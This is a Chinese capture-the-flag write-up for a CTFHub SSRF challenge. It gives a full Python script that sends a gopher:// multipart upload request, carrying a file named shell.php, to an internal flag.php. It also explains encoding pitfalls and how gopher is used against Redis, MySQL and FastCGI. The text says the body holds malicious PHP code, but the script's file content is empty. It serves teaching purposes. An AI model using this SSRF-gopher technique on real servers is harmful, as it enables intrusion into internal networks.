CTFHub SSRF - 文件上传

2026年9月23日 CTFHub Web安全 SSRF gopher协议

一、题目信息

  • 题目名称：文件上传（SSRF）
  • 题目平台：CTFHub 技能树
  • 题目类型：Web安全 / SSRF（服务端请求伪造） / gopher协议利用 / 文件上传
  • 靶场链接：http://challenge-71a9e1e852b8c132.sandbox.ctfhub.com:10800（动态环境）
  • 涉及工具：Chrome浏览器（F12）、Python（requests库、urllib.parse库）

二、解题步骤

1. 分析题目考什么

本题的核心考点是利用 gopher 协议构造并发送 HTTP 文件上传请求（multipart/form-data）。题目提示“这次需要上传一个文件到 flag.php 了”。普通的 HTTP 请求无法让 SSRF 发送文件，且直接访问内网 flag.php 会被限制。攻击者必须利用 gopher 协议手工构造包含 boundary、Content-Disposition 和请求体的原始 HTTP 数据流，让服务器端代理发送文件上传请求并获取 Flag。

2. 怎么想（破题思路）

  • 参数为 ?url=_，存在 SSRF 漏洞。
  • 题目明确提示：“需要上传一个文件到 flag.php”。
  • 直接使用 http://127.0.0.1/flag.php 请求，无法携带文件，且 GET 请求会被忽略。
  • 突破口：使用 gopher:// 协议。它可以充当“原始 TCP 数据包发送器”，将完整的 multipart/form-data POST 数据包原样发送给内网服务的 80 端口。
  • 核心痛点：必须精确计算 Content-Length（请求体长度）。手工计算极其容易出错，本次实战中尝试了 203、208、210、204 等多次均告失败，最终必须借助 Python 脚本自动计算长度才成功（精确长度为 206）。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：手工计算 Content-Length 导致失败

踩坑情况：多次用肉眼计算 multipart 数据包长度，尝试 203、208、210、204 等值，服务器均返回 Content-Length: 0（空白）。

原因分析：PHP 解析器极其严格，Content-Length 错一个字节就会导致整个请求体被丢弃。手工计算时，很容易漏算换行符（\r\n）或空格的字节数。

改进方式：放弃手工计算，改用 Python 脚本的 len() 函数自动计算精确字节数（206）。

踩坑记录二：浏览器地址栏自动二次编码

踩坑情况：直接在浏览器地址栏输入 gopher Payload，页面返回空白或乱码。

原因分析：浏览器会对 URL 中的 % 进行二次转义（例如把 %0d 变成 %250d），导致 gopher 协议发送给内部服务的 HTTP 数据包格式损坏。

改进方式：必须使用 Python 脚本或 curl 命令行发送请求，这两者都不会对 URL 进行二次编码。

详细实操步骤（使用 Python 自动化脚本）

第一步：获取内网文件上传表单信息

浏览器访问 ?url=http://127.0.0.1/flag.php，按 Ctrl+U 查看源码，确认是 POST 请求且需要 multipart/form-data 格式。

第二步：编写 Python 自动化脚本

在本地新建 exploit.py，粘贴以下代码：

import requests
import urllib.parse

base_url = "http://challenge-71a9e1e852b8c132.sandbox.ctfhub.com:10800/?url="
boundary = "----WebKitFormBoundaryABC123"
body = (
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
    f"Content-Type: application/octet-stream\r\n"
    f"\r\n"
    f"\r\n"
    f"--{boundary}--\r\n"
)
content_length = len(body)

http_request = (
    f"POST /flag.php HTTP/1.1\r\n"
    f"Host: 127.0.0.1\r\n"
    f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
    f"Content-Length: {content_length}\r\n"
    f"\r\n"
    f"{body}"
)

encoded_request = urllib.parse.quote(http_request)
gopher_payload = f"gopher://127.0.0.1:80/_{encoded_request}"
target_url = base_url + urllib.parse.quote(gopher_payload)

print(f"[*] 正在发送 Payload，自动计算的长度为: {content_length}")
response = requests.get(target_url)
print("[*] 服务器响应如下：")
print(response.text)

脚本逐字深度解析：

  • import requests：导入 Python 的 HTTP 请求库，用于发送网络请求。
  • import urllib.parse：导入 URL 解析库，用于自动处理特殊字符的 URL 编码。
  • base_url：靶机地址，注意这里包含了 ?url= 参数前缀。
  • boundary = "----WebKitFormBoundaryABC123"：定义 multipart 数据包的分隔符。它的作用是在 HTTP 请求体中，把文件内容和普通表单字段区分开来。字符串本身是可以自定义的。
  • body = (...)：构造 HTTP 请求体。包含 --boundary、Content-Disposition（描述文件信息和字段名）、Content-Type（文件类型）、空行、以及恶意 PHP 代码。\r\n 是 HTTP 协议规定的换行符。
  • content_length = len(body)：核心所在！len() 函数自动计算 body 字符串的字节长度。这就是为什么我们不再手工数数——计算机数得绝对准确。
  • http_request = (...)：拼接完整的 HTTP POST 请求头。必须带上 Host、Content-Type（包含 boundary）和 Content-Length。
  • urllib.parse.quote(http_request)：将整个 HTTP 请求包进行 URL 编码。它自动把空格变成 %20，把 \r\n 变成 %0d%0a。这是 gopher 协议发送原始数据的前置要求。
  • gopher_payload = f"gopher://127.0.0.1:80/_{encoded_request}"：拼接 gopher 协议地址。_ 是 gopher 协议的占位符，必不可少。
  • target_url = base_url + urllib.parse.quote(gopher_payload)：将 gopher payload 整体再进行一次 URL 编码，作为参数传给靶机。
  • response = requests.get(target_url)：发送最终的 GET 请求。靶机接收到请求后，会解析出 ?url= 里面的 gopher 地址，然后向 127.0.0.1:80 发起 TCP 连接并发送我们构造好的 POST 数据包。

第三步：在终端运行脚本

终端执行 python3 exploit.py，页面成功回显 Flag：ctfhub{c83edda051db09e919f03d8f}。提交即可通关。

  • 跨学科迁移：生物学家用显微镜观察细胞，天文学家用望远镜观测星体。在 Web 安全中，gopher 协议和 Python 脚本就是我们的“显微镜”和“望远镜”。遇到防御森严的目标，不要硬碰，而是找一把趁手的工具，从底层进行降维打击。

三、名词大全与原理深度复盘

1. SSRF（服务端请求伪造）

一种由攻击者构造请求，由服务端发起请求的安全漏洞。通俗地说，就是服务器被黑客当成了“内鬼”。你（外网用户）进不去公司的内网，但服务器自己可以。于是你骗服务器：“帮我去内网拿个东西”，服务器老实巴交地去拿了，并把结果交给你。

2. gopher 协议

一种早期的互联网协议（全称：Gopher）。在 SSRF 漏洞中，它因为“可以发送任意 TCP 数据流”而被称为“万能协议”。普通的 HTTP 请求无法携带文件或发送 POST 请求，而 gopher 允许你手工捏造任何格式的底层数据包（例如 HTTP 文件上传包、Redis 命令包），然后让服务器原封不动地发送过去。

3. multipart/form-data

HTTP 协议中用于传输文件的标准数据格式。它是一种“多部分”格式，通过一个叫做 boundary（边界）的字符串来分割不同的字段。就像用一堆信封装东西，每个信封上写好“这个包装的是文件”、“这个包装的是用户名字”。

4. Content-Length（内容长度）

HTTP 协议中用来指明请求体（Body）大小的字段。这里有一个极其苛刻的底层逻辑：它必须精确等于请求体的字节数，包括每一个回车换行、每一个空格。多一个字节，服务器会等待更多数据；少一个字节，服务器会截断请求体，导致 PHP 无法解析文件。 这也是我们在本题中反复踩坑的根源。

5. Python requests 库与 urllib.parse 库

requests 是 Python 中最流行的 HTTP 请求库，用于轻松发送 GET/POST 请求。urllib.parse.quote() 是 Python 内置的 URL 编码函数，它能够自动将特殊字符（如 \r\n、空格）转换为 % 编码格式（如 %0d%0a、%20），使数据能够安全地在 URL 中传输。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与“内网访问”的区别：“内网访问”只是简单的 GET 请求（`?url=http://127.0.0.1/flag.php`）；本题需要构造一个完整的 POST 请求，并且带有 `multipart/form-data` 文件上传数据。
  • 与“伪协议读取文件”的区别：伪协议利用 file:// 直接读文件，属于底层文件系统的利用；本题利用 gopher:// 发送网络数据包，属于网络层的攻击。
  • 与“手工计算 vs 脚本自动化”的区别：前面手工算失败是因为算错了，这道题生动地展示了“工具化”的重要性。

2. 这种题目的出现原因

这类漏洞源于开发人员对“用户输入”的过度信任。就像生活中的例子：你让公司前台（服务器）帮你代收一份快递（URL），但你给了它一个“内部机密文件室（127.0.0.1）”的地址，前台没多想就进去了。开发人员在编写 cURL 请求代码时，没有限制用户输入的协议（比如只允许 http/https）和 IP 地址（比如禁止 192.168 或 127.0.0.1），导致服务器成为了攻击者探测内网的“肉鸡”。

3. 这种应用在实际中如何体现？

在真实渗透测试中，SSRF 配合 gopher 协议是打点内网服务的“核武器”。攻击者常利用它攻击 Redis、MySQL、FastCGI、Memcached 等服务，通过未授权访问或协议走私快速获取服务器权限，是内网横向移动的经典手段。

4. 如何抽象理解概念（大白话理解）

把服务器比作一个传令兵：

  • 普通 SSRF：你让传令兵去隔壁房间“看一眼”有没有文件（GET 请求）。
  • 文件上传（本题）：你让传令兵把一份文件递给隔壁房间。传令兵不懂怎么递。于是你亲手写好了一封完整的信（包含信封、格式、内容），装进了一个叫“gopher”的万能信封里递给他。
  • 手工计算长度 vs Python 脚本：信封上必须写“这封信有多重”（Content-Length）。你用手数，数错了 1 克，门卫就拒收。你用 Python 这个精准的天平（len()）自动称重，一次就准。这就是自动化工具的威力。
